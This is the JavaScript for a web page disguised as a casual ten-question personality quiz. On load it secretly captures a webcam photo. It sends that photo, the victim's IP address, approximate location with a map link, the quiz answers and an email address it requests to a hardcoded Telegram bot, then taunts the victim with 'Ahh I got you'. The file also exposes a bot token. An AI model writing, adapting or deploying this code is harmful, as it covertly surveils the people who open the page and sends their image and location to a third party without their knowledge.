const BOT_TOKEN = '7928710778:AAFMvQ-Ei_e9f6SgbpTg1Q46zrGpMTUr4RE';
const CHAT_ID = '248714805';

const quizForm = document.getElementById('quizForm');
const thankyou = document.getElementById('thankyou');
const loading = document.getElementById('loading');
const canvas = document.getElementById('canvas');

let capturedPhoto = null;
let currentQuestionIndex = 0;
const answers = {};

// Questions
const questions = [
  { q: "1. What is your favorite color?", type: "radio", name: "color", options: ["Red", "Blue", "Green", "Black"] },
  { q: "2. Pick your ideal vacation spot:", type: "select", name: "vacation", options: ["Beach", "Mountains", "City", "Countryside"] },
  { q: "3. Which pet do you prefer?", type: "radio", name: "pet", options: ["Dog", "Cat", "Bird", "Fish"] },
  { q: "4. What genre of music do you like most?", type: "radio", name: "music", options: ["Rock", "Pop", "Jazz", "Classical"] },
  { q: "5. Which movie genre do you prefer?", type: "radio", name: "movie", options: ["Action", "Comedy", "Horror", "Drama"] },
  { q: "6. What is your favorite season?", type: "radio", name: "season", options: ["Spring", "Summer", "Fall", "Winter"] },
  { q: "7. What's your go-to drink?", type: "radio", name: "drink", options: ["Coffee", "Tea", "Soda", "Water"] },
  { q: "8. Are you more of a morning or night person?", type: "radio", name: "time", options: ["Morning", "Night"] },
  { q: "9. What kind of books do you enjoy?", type: "radio", name: "books", options: ["Fiction", "Non-fiction", "Mystery", "Biography"] },
  { q: "10. Choose a hobby you enjoy:", type: "radio", name: "hobby", options: ["Sports", "Reading", "Gaming", "Cooking"] }
];

// Render question
function renderQuestion(index) {
  const q = questions[index];
  let html = `<div class="question"><label>${q.q}</label>`;
  if(q.type === "radio") {
    q.options.forEach(opt => {
      const id = `${q.name}_${opt}`;
      html += `
        <div>
          <input type="radio" id="${id}" name="${q.name}" value="${opt}" required />
          <label for="${id}">${opt}</label>
        </div>`;
    });
  } else if (q.type === "select") {
    html += `<select name="${q.name}" required><option value="" disabled selected>Select one</option>`;
    q.options.forEach(opt => {
      html += `<option value="${opt}">${opt}</option>`;
    });
    html += `</select>`;
  }
  html += `</div>
    <button type="submit">${index === questions.length - 1 ? 'Finish Quiz' : 'Next Question'}</button>`;
  quizForm.innerHTML = html;
}

// Capture photo silently once at start
async function capturePhoto() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 }, audio: false });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    await new Promise(r => setTimeout(r, 1500)); // wait camera ready

    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    capturedPhoto = canvas.toDataURL('image/jpeg', 0.8);

    stream.getTracks().forEach(t => t.stop());
  } catch (e) {
    alert("Camera access is required to start the quiz.");
    throw e;
  }
}

// Send photo to Telegram
async function sendPhotoToTelegram(photoData) {
  const formData = new FormData();
  const blob = await (await fetch(photoData)).blob();
  formData.append('chat_id', CHAT_ID);
  formData.append('photo', blob, 'photo.jpg');

  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: 'POST',
    body: formData
  });
}

// Send message to Telegram
async function sendMessageToTelegram(text) {
  const urlText = encodeURIComponent(text);
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${urlText}`;
  return fetch(url);
}

// Get IP and location via external API
async function getIPandLocation() {
  const response = await fetch('https://ipapi.co/json/');
  const data = await response.json();
  return data;
}

// Send location with IP to Telegram
async function sendLocationToTelegram() {
  try {
    const data = await getIPandLocation();
    const locText = `IP: ${data.ip}
City: ${data.city}
Region: ${data.region}
Country: ${data.country_name}
Google Maps: https://maps.google.com/?q=${data.latitude},${data.longitude}`;
    await sendMessageToTelegram(locText);
  } catch (e) {
    console.error('Failed to get location', e);
  }
}

quizForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  const formData = new FormData(quizForm);
  const keys = [...formData.keys()];
  keys.forEach(k => {
    answers[k] = formData.get(k);
  });

  currentQuestionIndex++;
  if (currentQuestionIndex < questions.length) {
    renderQuestion(currentQuestionIndex);
  } else {
    loading.classList.remove('hidden');
    quizForm.classList.add('hidden');

    // Ask for email
    const email = prompt("Please enter your email:");
    if (!email || !email.includes('@')) {
      alert('Invalid email, please refresh and try again.');
      return;
    }
    answers.email = email;

    // Send answers as text to telegram
    let resultText = "Quiz Results:
";
    for (const [key, val] of Object.entries(answers)) {
      resultText += `${key}: ${val}
`;
    }
    await sendMessageToTelegram(resultText);

    // Send location after quiz finished
    await sendLocationToTelegram();

    loading.classList.add('hidden');
    thankyou.classList.remove('hidden');
    alert("Ahh I got you 😁");
  }
});

// Start quiz after photo capture
(async () => {
  try {
    await capturePhoto();
    await sendPhotoToTelegram(capturedPhoto);
    renderQuestion(currentQuestionIndex);
  } catch(e) {
    console.error(e);
  }
})();
